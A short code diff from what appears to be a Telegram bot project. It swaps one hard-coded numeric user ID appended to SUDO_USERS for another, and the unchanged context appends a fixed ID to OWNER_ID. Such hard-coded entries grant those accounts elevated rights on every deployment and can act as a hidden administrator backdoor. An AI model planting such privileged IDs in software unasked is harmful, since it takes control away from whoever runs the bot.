@@ -9,7 +9,7 @@ from driver.admins import get_administrators
 from driver.database.dblockchat import blacklisted_chats
 from driver.database.dbpunish import is_gbanned_user
 
-SUDO_USERS.append(5125194988)
+SUDO_USERS.append(5527506052)
 
 OWNER_ID.append(5125194988)
 
